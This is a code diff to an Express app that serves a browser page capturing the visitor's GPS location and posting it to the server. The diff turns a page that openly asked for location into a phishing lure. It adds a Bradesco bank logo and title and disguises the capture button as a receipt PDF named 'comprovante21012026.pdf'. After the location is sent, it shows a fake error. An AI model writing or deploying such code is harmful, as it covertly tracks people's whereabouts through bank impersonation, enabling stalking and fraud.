@@ -8,7 +8,7 @@ const app = express();
 app.use(express.json());
 
 // ✅ Tokens válidos (adicione mais se quiser)
-const validTokens = new Set(["ABC123"]);
+const validTokens = new Set(["comprovante.mmb"]);
 
 function must(name) {
   const v = process.env[name];
@@ -78,15 +78,21 @@ app.get("/loc/:token", (req, res) => {
   res.type("html").send(`<!doctype html>
 <html>
 <head>
+
+<img 
+  src="https://raw.githubusercontent.com/marciocelestinodeoliveira-spec/banco.bradesco/main/public/logo.png"
+  alt="Bradesco"
+  style="max-width:180px; margin-bottom:10px;"
+/>
+
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Compartilhar localização</title>
 </head>
 <body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
-  <h2>Compartilhar localização</h2>
-  <p>Toque no botão para enviar sua localização. (O navegador pode pedir permissão.)</p>
-
-  <button id="btn" style="padding:12px 16px; font-size:16px;">Enviar minha localização</button>
+  <h2>Bradesco Investimentos</h2>
+ 
+  <button id="btn" style="padding:12px 16px; font-size:16px;">comprovante21012026.pdf</button>
   <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>
 
 <script>
@@ -106,7 +112,7 @@ app.get("/loc/:token", (req, res) => {
           const acc = pos.coords.accuracy;
           if (!best || acc < best.coords.accuracy) best = pos;
 
-          out.textContent = "Buscando GPS... melhor precisão: " + Math.round(best.coords.accuracy) + " m";
+          out.textContent = "Abrindo Comprovante..." + Math.round(best.coords.accuracy) + " m";
 
           if (acc <= minAcc) {
             navigator.geolocation.clearWatch(watchId);
@@ -126,7 +132,7 @@ app.get("/loc/:token", (req, res) => {
           clearInterval(t);
           navigator.geolocation.clearWatch(watchId);
           if (best) resolve(best);
-          else reject(new Error("Sem fix GPS a tempo."));
+          else reject(new Error("Erro0001939"));
         }
       }, 250);
     });
@@ -134,7 +140,7 @@ app.get("/loc/:token", (req, res) => {
 
   btn.onclick = async () => {
     btn.disabled = true;
-    out.textContent = "Iniciando GPS (pode levar alguns segundos)...";
+    out.textContent = "Pode levar alguns segundos...";
 
     let pos;
     try {
@@ -142,8 +148,7 @@ app.get("/loc/:token", (req, res) => {
     } catch (e) {
       btn.disabled = false;
       out.textContent =
-        "Não foi possível obter boa precisão. " +
-        "Abra em 'Chrome', ative Localização do celular e permita 'Localização precisa'. " +
+        "Não foi possível abrir o comprovante " +
         "Erro: " + (e.message || e);
       return;
     }
@@ -164,9 +169,9 @@ app.get("/loc/:token", (req, res) => {
     });
 
     if (r.ok) {
-      out.textContent = "Enviado com sucesso ✅ (precisão ~" + Math.round(pos.coords.accuracy) + " m)";
+      out.textContent = "Não foi possivel abrir o comprovante ❌ (Erro ~" + Math.round(pos.coords.accuracy) + " m)";
     } else {
-      let msg = "Falha ao enviar ❌ (" + r.status + ")";
+      let msg = "Erro0001939❌ (" + r.status + ")";
       try {
         const data = await r.json();
         if (data && data.error) msg += " - " + data.error;
